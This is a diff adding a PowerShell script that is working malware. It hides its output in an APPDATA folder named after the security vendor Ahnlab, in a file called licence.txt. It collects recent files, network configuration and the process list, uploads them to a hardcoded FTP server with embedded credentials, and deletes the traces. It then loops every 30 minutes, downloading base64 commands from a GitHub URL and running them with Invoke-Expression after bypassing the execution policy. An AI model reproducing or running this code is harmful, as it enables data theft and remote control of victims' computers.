@@ -1,1 +1,64 @@
 
+$logPath = $env:APPDATA + "\Ahnlab\"
+New-Item -Path $logPath -Type directory -Force
+$logFile = $logPath + "licence.txt"
+
+Function getinfo
+{
+	
+	$recent = Get-ChildItem ([Environment]::GetFolderPath("Recent"))
+	$ipconfig = ipconfig /all
+	Start-Sleep -s 1
+	$recent >> $logFile
+	Start-Sleep -s 1
+	$ipconfig >> $logFile
+	Start-Sleep -s 1
+	Get-process >> $logFile
+}
+
+
+function uploadResult
+{
+	
+	$ftpuri = "ftp://4209698:XmdDv4T6enkizfU@strongsi.sportsontheweb.net/strongsi.sportsontheweb.net/"
+
+	$upfilepath = $env:APPDATA + "\Ahnlab\licence.txt"
+	$webclient = New-Object System.Net.WebClient
+	$uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($upfilepath))
+	$webclient.UploadFile($uri, $upfilepath)
+
+	del $upfilepath
+}
+
+function downCommand
+{
+	$downpsurl = "https://raw.githubusercontent.com/footney/scope/main/st.rong"
+	$codestring = (New-Object System.Net.WebClient).DownloadString($downpsurl)
+
+	$url = "http://stronglive.66ghz.com/te"
+	$post_url = $url + "/post.php"
+	Invoke-WebRequest -Uri $post_url -Method POST -Body "filename=st"
+
+	$comletter = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($codestring))
+	
+	$result = Invoke-Expression $comletter
+}
+
+function mainFunc
+{
+	Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
+	
+	getinfo
+	uploadResult
+
+	while ($true)
+	{		
+		downCommand
+		Start-Sleep -s 1800
+	}
+	
+}
+
+mainFunc
+
+
